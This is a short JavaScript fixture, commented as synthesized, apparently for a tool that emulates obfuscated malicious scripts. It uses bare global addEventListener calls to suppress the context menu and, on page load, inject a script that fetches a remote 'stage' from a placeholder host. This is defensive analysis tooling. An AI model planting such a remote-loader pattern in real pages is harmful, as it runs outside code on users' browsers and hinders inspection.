// Synthesized (NOT sample-derived). Real obfuscated samples call the BARE
// global addEventListener, not window.addEventListener -- often both in the
// same file. Without a bare global the sample dies on ReferenceError before
// reaching its payload, exactly as it did with TextDecoder.
addEventListener('contextmenu', function (e) { e.preventDefault(); }, { capture: true });

addEventListener('DOMContentLoaded', function () {
  var s = document.createElement('script');
  s.src = 'https://example.com/bare-global-stage.js';
  document.head.appendChild(s);
});
